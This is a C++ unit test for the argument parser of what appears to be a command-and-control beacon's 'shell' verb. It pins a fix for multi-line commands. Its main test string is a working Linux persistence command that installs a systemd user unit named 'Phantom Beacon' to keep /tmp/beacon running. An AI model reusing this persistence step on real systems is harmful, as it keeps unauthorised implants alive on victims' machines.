// Compile-and-run test for command_line::argument_rest.
//
// The regression it pins: the beacon's shell verb used std::getline, which
// truncated the command at the first newline. A Linux persistence command
// carries a systemd unit with real newlines inside single quotes, so the
// target received an unterminated quote and every install failed with
// "sh: 1: Syntax error: Unterminated quoted string".
//
// Build and run (also done by tests/test_beacon_command_line.py):
//   g++ -std=c++20 -O1 -o command_line_test tests/test_beacon_command_line.cpp
//   ./command_line_test

#include <iostream>
#include <string>

#include "command_line.h"

namespace {

int failures = 0;

void check(const std::string& name, const std::string& got,
           const std::string& want) {
    if (got == want) return;
    ++failures;
    std::cerr << "FAIL " << name << "\n  got:  " << got
              << "\n  want: " << want << "\n";
}

}  // namespace

int main() {
    // The exact shape that broke: a multi-line systemd unit inside single
    // quotes. Everything after `shell ` must survive byte for byte.
    const std::string unit =
        "mkdir -p ~/.config/systemd/user && printf '%s' '[Unit]\n"
        "Description=Phantom Beacon\n"
        "[Service]\n"
        "ExecStart=/tmp/beacon\n"
        "Restart=always\n"
        "[Install]\n"
        "WantedBy=default.target' > ~/.config/systemd/user/p.service "
        "&& echo PERSISTENCE_OK systemd";
    const std::string command = "shell " + unit;
    check("multi-line unit", command_line::argument_rest(command), unit);

    // Leading separators are not part of the argument; trailing bytes are.
    check("leading spaces", command_line::argument_rest("shell   echo hi"), "echo hi");
    check("tab separator", command_line::argument_rest("shell\techo hi"), "echo hi");
    check("crlf separator", command_line::argument_rest("shell\r\necho hi"), "echo hi");

    // A newline INSIDE the argument is data, not a terminator.
    check("newline inside", command_line::argument_rest("shell echo a\necho b"),
          "echo a\necho b");

    // Single-line commands are unchanged.
    check("plain", command_line::argument_rest("shell id"), "id");
    check("quotes", command_line::argument_rest("shell echo \"a b\""),
          "echo \"a b\"");

    // No argument at all.
    check("no argument", command_line::argument_rest("shell"), "");
    check("only spaces", command_line::argument_rest("shell   "), "");

    if (failures) {
        std::cerr << failures << " command-line check(s) failed\n";
        return 1;
    }
    std::cout << "all command-line checks passed\n";
    return 0;
}
